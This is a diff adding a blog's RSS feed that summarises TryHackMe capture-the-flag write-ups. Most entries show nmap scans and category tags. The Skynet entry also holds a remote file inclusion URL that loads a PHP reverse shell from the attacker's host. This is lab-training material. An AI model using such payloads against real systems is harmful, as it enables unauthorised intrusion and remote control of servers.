@@ -1,0 +1,801 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>enumeration on Blog</title>
+    <link>https://martinkubecka.github.io/en/tags/enumeration/</link>
+    <description>Recent content in enumeration on Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>&amp;copy;{year}, All Rights Reserved</copyright>
+    <lastBuildDate>Sat, 06 Feb 2021 00:00:00 +0000</lastBuildDate>
+    
+        <atom:link href="https://martinkubecka.github.io/en/tags/enumeration/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>Mr Robot CTF [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/mr-robot-ctf/</link>
+        <pubDate>Sat, 06 Feb 2021 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 06 Feb 2021 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/mr-robot-ctf/</guid>
+        <description>Title Mr Robot CTF     Info Based on the Mr. Robot show, can you root this box?   Difficulty Medium    Scanning &amp;amp; Enumeration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  nmap -sV -sC 10.10.43.138 -oN initial.nmap Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 11:50 CST Nmap scan report for 10.</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/mr-robot-ctf/icon.jpeg" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>wordpress</category>
+            
+          
+            
+              <category>hash cracking</category>
+            
+          
+            
+              <category>privilege escalation</category>
+            
+          
+        
+        
+          
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Archangel [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/archangel/</link>
+        <pubDate>Fri, 05 Feb 2021 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Fri, 05 Feb 2021 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/archangel/</guid>
+        <description>Title Archangel     Info Boot2root, Web exploitation, Privilege escalation, LFI   Difficulty Easy    Scanning &amp;amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  nmap -A -T4 10.10.226.24 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-05 01:08 CST Nmap scan report for 10.10.226.24 Host is up (0.077s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/archangel/icon.jpeg" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>decoding</category>
+            
+          
+            
+              <category>brute force</category>
+            
+          
+            
+              <category>lfi</category>
+            
+          
+            
+              <category>log poisoning</category>
+            
+          
+            
+              <category>exploitation</category>
+            
+          
+            
+              <category>privilege escalation</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Game Zone [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/game-zone/</link>
+        <pubDate>Thu, 07 Jan 2021 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Thu, 07 Jan 2021 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/game-zone/</guid>
+        <description>Title Game Zone     Info Learn to hack into this machine. Understand how to use SQLMap, crack passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!   Difficulty Easy    Reconnaissance Deploy the machine and access its web server.
+ What is the name of the large cartoon avatar holding a sniper on the forum?</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/game-zone/icon.jpeg" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>sql</category>
+            
+          
+            
+              <category>hash cracking</category>
+            
+          
+            
+              <category>exploitation</category>
+            
+          
+            
+              <category>reverse SSH</category>
+            
+          
+            
+              <category>metasploit</category>
+            
+          
+            
+              <category>webmin</category>
+            
+          
+            
+              <category>privilege escalation</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>HA Joker CTF [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/ha-joker-ctf/</link>
+        <pubDate>Wed, 06 Jan 2021 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Wed, 06 Jan 2021 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/ha-joker-ctf/</guid>
+        <description>Title HA Joker CTF     Info Batman hits Joker.   Difficulty Medium    Scanning &amp;amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12  nmap -p- -sV {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 01:40 CST Stats: 0:04:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 59.</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/ha-joker-ctf/icon.jpeg" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>hash cracking</category>
+            
+          
+            
+              <category>lxd</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Jack-of-All-Trades [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/jack-of-all-trades/</link>
+        <pubDate>Tue, 05 Jan 2021 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Tue, 05 Jan 2021 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/jack-of-all-trades/</guid>
+        <description>Title Jack-of-All-Trades     Info Boot-to-root originally designed for Securi-Tay 2020   Difficulty Easy    Scanning &amp;amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  nmap -A -T4 {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-05 12:33 CST Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/jack-of-all-trades/icon.jpeg" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>privilege escalation</category>
+            
+          
+            
+              <category>steganography</category>
+            
+          
+            
+              <category>command injection</category>
+            
+          
+            
+              <category>brute force</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Gaming Server [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/gaming-server/</link>
+        <pubDate>Sun, 03 Jan 2021 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sun, 03 Jan 2021 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/gaming-server/</guid>
+        <description>Title Gaming Server     Info An Easy Boot2Root box for beginners   Difficulty Easy    Scanning &amp;amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14  nmap -A -T4 {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 01:08 CST Nmap scan report for 10.10.125.45 Host is up (0.074s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/gaming-server/icon.jpeg" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>hash cracking</category>
+            
+          
+            
+              <category>lxd</category>
+            
+          
+            
+              <category>privilege escalation</category>
+            
+          
+        
+        
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Wgel [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/wgel/</link>
+        <pubDate>Fri, 01 Jan 2021 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Fri, 01 Jan 2021 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/wgel/</guid>
+        <description>Title Wgel     Info Can you exfiltrate the root flag?   Difficulty Easy    Scanning &amp;amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11  nmap -A -T4 10.10.184.94 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA) | 256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA) |_ 256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519) 80/tcp open http Apache httpd 2.</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/wgel/icon.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>exploitation</category>
+            
+          
+        
+        
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Mnemonic [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/mnemonic/</link>
+        <pubDate>Tue, 29 Dec 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Tue, 29 Dec 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/mnemonic/</guid>
+        <description>Title Mnemonic     Info I hope you have fun.   Difficulty Medium    Scanning &amp;amp; Enumeration Nmap  How many open ports?
+What is the ssh port number?
+ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  nmap -p- -A -T4 {TARGET MACHINE IP} Starting Nmap 7.</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/mnemonic/icon.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>ftp</category>
+            
+          
+            
+              <category>zip cracking</category>
+            
+          
+            
+              <category>decoding</category>
+            
+          
+            
+              <category>steganography</category>
+            
+          
+            
+              <category>python</category>
+            
+          
+            
+              <category>privilege escalation</category>
+            
+          
+        
+        
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Overpass [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/overpass/</link>
+        <pubDate>Sat, 12 Dec 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 12 Dec 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/overpass/</guid>
+        <description>Title Overpass     Info What happens when some broke CompSci students make a password manager?   Difficulty Easy    Scanning &amp;amp; Enumeration Nmap Let&amp;rsquo;s start with nmap:
+1 2 3 4 5 6 7  nmap -vv -sC -sV {TARGET MACHINE} PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API) .</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/overpass/icon.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>hash cracking</category>
+            
+          
+            
+              <category>enumeration scripts</category>
+            
+          
+            
+              <category>cron</category>
+            
+          
+            
+              <category>privilege escalation</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Anthem [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/anthem/</link>
+        <pubDate>Sat, 21 Nov 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 21 Nov 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/anthem/</guid>
+        <description>Title Anthem     Info Exploit a Windows machine in this beginner level challenge.   Difficulty Easy    Website Analysis Let&amp;rsquo;s run nmap and check what ports are open.
+What port is for the web server?
+
+What port is for remote desktop service?
+
+What is a possible password in one of the pages web crawlers check for?
+
+What CMS is the website using?</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/anthem/icon.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>cms</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Windows</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Ignite [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/ignite/</link>
+        <pubDate>Fri, 20 Nov 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Fri, 20 Nov 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/ignite/</guid>
+        <description>Title Ignite     Info A new start-up has a few issues with their web server.   Difficulty Easy    Scanning &amp;amp; Enumeration Nmap 
+Reconnaissance 
+
+Gaining Access fuelCMS Exploitation 
+
+
+
+
+Privilege Escalation</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/ignite/icon.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>cms</category>
+            
+          
+            
+              <category>privilege escalation</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>GoldenEye [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/goldeneye/</link>
+        <pubDate>Wed, 18 Nov 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Wed, 18 Nov 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/goldeneye/</guid>
+        <description>Title GoldenEye     Info Bond, James Bond. A guided CTF.   Difficulty Medium    Scanning &amp;amp; Enumeration Nmap Use nmap to scan the network for all ports.
+How many ports are open?
+
+Website Take a look on the website, take a dive into the source code too and remember to inspect all scripts!
+Who needs to make sure they update their default password?</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/goldeneye/icon.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>decoding</category>
+            
+          
+            
+              <category>telnet</category>
+            
+          
+            
+              <category>pop3</category>
+            
+          
+            
+              <category>brute force</category>
+            
+          
+            
+              <category>python</category>
+            
+          
+            
+              <category>exploitation</category>
+            
+          
+            
+              <category>privilege escalation</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Fowsniff CTF [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/fowsniff-ctf/</link>
+        <pubDate>Sun, 15 Nov 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sun, 15 Nov 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/fowsniff-ctf/</guid>
+        <description>Title Fowsniff CTF     Info Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!   Difficulty Easy    Scanning &amp;amp; Enumeration Nmap Using nmap, scan this machine. What ports are open?
+Using the information from the open ports. Look around. What can you find?
+
+POP3 Using Google, can you find any public information about them?</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/fowsniff-ctf/icon.jpeg" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>exploitation</category>
+            
+          
+            
+              <category>pop3</category>
+            
+          
+            
+              <category>brute force</category>
+            
+          
+            
+              <category>python</category>
+            
+          
+            
+              <category>metasploit</category>
+            
+          
+        
+        
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Skynet [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/skynet/</link>
+        <pubDate>Sat, 14 Nov 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 14 Nov 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/skynet/</guid>
+        <description>Title Skynet     Info A vulnerable Terminator themed Linux machine.   Difficulty Easy    Scanning &amp;amp; Enumeration Nmap 
+
+Directory Brute-Forcing 
+
+Samba 
+
+
+
+
+Accessing Webmail 
+
+
+Further Enumeration 
+
+
+
+Gaining Access Cuppa CMS Exploitation 
+
+https://www.exploit-db.com/exploits/25971
+ http://10.10.201.252/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.140.180:8888/php-reverse-shell.php
+ 
+
+Privilege Escalation 
+
+ https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/skynet/icon.jpeg" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>smb</category>
+            
+          
+            
+              <category>cms</category>
+            
+          
+            
+              <category>cron</category>
+            
+          
+        
+        
+          
+            
+              <category>Web</category>
+            
+          
+            
+              <category>Linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>Startup [TryHackMe]</title>
+        <link>https://martinkubecka.github.io/en/posts/thm/startup/</link>
+        <pubDate>Tue, 10 Nov 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Tue, 10 Nov 2020 00:00:00 +0000</atom:modified>
+        <guid>https://martinkubecka.github.io/en/posts/thm/startup/</guid>
+        <description>Title Startup     Info Abuse traditional vulnerabilities via untraditional means.   Difficulty Easy    Reconnaissance 
+Scanning &amp;amp; Enumeration Nmap 
+FTP 
+Directory Brute-Forcing 
+
+
+Gaining Access 
+
+
+
+
+
+
+
+
+
+
+Privilege Escalation</description>
+        
+        <dc:creator>Martin Kubecka</dc:creator>
+        <media:content url="https://martinkubecka.github.io/images/thm/startup/icon.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>enumeration</category>
+            
+          
+            
+              <category>ftp</category>
+            
+          
+            
+              <category>cron</category>
+            
+          
+            
+              <category>privilege escalation</category>
+            
+          
+        
+        
+          
+            
+          
+        
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
